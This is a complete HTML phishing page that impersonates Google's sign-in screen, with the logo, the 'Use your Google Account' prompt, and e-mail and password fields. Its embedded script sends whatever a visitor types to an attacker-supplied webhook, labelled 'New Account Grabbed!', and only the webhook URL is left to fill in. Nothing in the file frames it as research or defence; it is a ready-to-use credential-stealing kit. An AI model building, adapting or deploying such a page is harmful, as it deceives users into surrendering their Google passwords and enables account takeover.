<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />
    <link rel="shortcut icon" href="./682665_favicon_google_logo_new_icon.png" type="image/x-icon">

    <style>
* {
  margin: 0;
  padding: 0;
  font-family: "Roboto", sans-serif;
  box-sizing: border-box;
}

:root {
  --principal: #202124;
  --p: #797d80;
  --blue: #2c7fea;
  --border-card: #dadce0;
}

/* Default light mode styles */
body {
  background-color: #f0f0f0;
  color: var(--principal);
}

.container {
  width: 100vw;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}

.card {
  height: 500px;
  width: 448px;
  border-radius: 8px;
  border: 1px solid var(--border-card);
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 48px 40px 36px;
  background-color: white;
}

.card h2 {
  padding-top: 16px;
  font-weight: 400;
  font-size: 24px;
}

.card h3 {
  padding: 11px 0 35px 0;
  font-weight: 400;
  font-size: 16px;
}

.card input {
  padding: 13px 15px;
  width: 100%;
  height: 55px;
  border-radius: 4px;
  border: 1px solid var(--border-card);
  outline-color: #1973e8;
  font-size: 16px;
}

.card .btn-email {
  padding-top: 12px;
  width: 100%;
}

.card .btn-email button {
  background: transparent;
  border: none;
  cursor: pointer;
  color: var(--blue);
  font-weight: bold;
  font-size: 14px;
  outline: none;
}

.card .card-bottom {
  margin-top: 32px;
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.card .card-bottom a {
  border: none;
  cursor: pointer;
  color: var(--blue);
  font-weight: bold;
  text-decoration: none;
  font-size: 14px;
  margin: 8px;
}

.card .card-bottom button {
  background: var(--blue);
  color: white;
  padding: 9px 24px;
  font-size: 14px;
  outline: none;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: 0.2s;
}

.card .card-bottom button:hover {
  background: #1a66c9;
}

.footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding-top: 24px;
  font-size: 12px;
  width: 448px;
  color: var(--p);
}

.footer select {
  background-color: white; /* Light background in light mode */
  color: var(--principal); /* Text color */
  border: 1px solid var(--border-card); /* Light border */
  padding: 8px 12px; /* Padding for better appearance */
  border-radius: 4px; /* Rounded corners */
  cursor: pointer;
  outline: none;
}

/* Dark Mode styles */
@media (prefers-color-scheme: dark) {
  body {
    background-color: #121212;
    color: white;
  }

  .card {
    background-color: #333;
    border: 1px solid #444;
  }

  .card h2, .card h3, .card p, .card .card-bottom a {
    color: white;
  }

  .card input {
    background-color: #444;
    border: 1px solid #555;
    color: white;
  }

  .card .btn-email button {
    color: #1a73e8;
  }

  .card .card-bottom button {
    background: #1a73e8;
    color: white;
  }

  .footer {
    color: #bbb;
  }

  /* Dark mode select styles */
  .footer select {
    background-color: #444; /* Dark background in dark mode */
    color: white; /* Text color */
    border: 1px solid #555; /* Dark border */
  }
}


    </style>
    <title>Google Login</title>
  </head>

  <body>
    <div class="container">
      <div class="card">
        <img src="./images/google-logo.svg" alt="Google Logo" />
        <h2>Log In</h2>
        <h3>Use your Google Account</h3>

        <input type="email" id="email" placeholder="E-mail" />
        <br>
        <input type="password" id="password" placeholder="Password" />
        <div class="btn-email">
          <button type="button">Forgot your password?</button>
        </div>

        <div class="card-bottom">
          <a href="#">Create Account</a>
          <button type="button" onclick="verify()">Next</button>
        </div>
      </div>

      <div class="footer">
        <select name="select">
          <option value="English (United States)" selected>English (United States)</option>
          <option value="Portugês (Brasil)">Portugês (Brasil)</option>
          <option value="Español (España)">Español (España)</option>
        </select>

        <div class="footer-span">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>

    <script>
      function verify() {
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        if (email && password) {
          fetch("PLACE WEBHOOK HERE", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              username: "log-thing",
              embeds: [{
                title: "❗ New Account Grabbed! ❗",
                description: `**Email Address:**\n*${email}*\n**Password:**\n*${password}*`,
                color: 0x00ff04,
              }],
            }),
          }).catch(console.error);
        }
      }
    </script>
  </body>
</html>
